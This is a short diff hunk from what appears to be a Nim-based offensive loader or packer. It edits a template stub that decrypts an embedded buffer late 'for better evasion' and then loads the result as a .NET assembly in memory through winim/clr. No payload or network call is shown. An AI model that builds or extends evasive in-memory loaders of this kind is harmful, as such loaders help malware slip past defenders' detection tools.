@@ -803,6 +803,8 @@ from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
 let LoadAssemblyStub = fmt"""
 
 # Actually decrypt after doing everything else for better evasion.
+ptrEncText = cast[ptr byte](addr enctext[0])
+ptrDecText = cast[ptr byte](addr dectext[0])
 decryptlate()
 
 var assembly = load(dectext)
